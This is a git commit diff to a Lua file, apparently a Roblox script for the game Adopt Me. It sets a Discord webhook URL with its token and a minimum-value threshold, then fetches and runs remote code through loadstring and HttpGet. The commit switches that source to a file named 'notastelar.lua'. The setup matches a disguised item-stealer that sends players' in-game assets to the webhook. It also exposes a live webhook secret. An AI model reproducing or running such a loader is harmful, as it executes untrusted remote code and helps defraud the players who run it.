5a408f2ee4a665d84fa8bd278119cbdb77871086
gabriela-8w <danciugabriela12@gmail.com>
2025-04-25 12:46:25 +0300

    Update text.lua

--- text.lua
+++ text.lua
@@ -3,4 +3,4 @@ _G.min_value = 0.1
 _G.pingEveryone = "Yes"
 _G.webhook = "https://discord.com/api/webhooks/1365244051091226695/uA_0Uai7gCwQNtuTmhwWAag7eonlnguHrAj9vQL6xS5V2DDZVDwEAsvgjMHD_QBjAJLU"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/tobi437a/Adopt-Me/refs/heads/main/FREEadoptme.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/gabriela-8w/yaauaua/refs/heads/main/notastelar.lua"))()
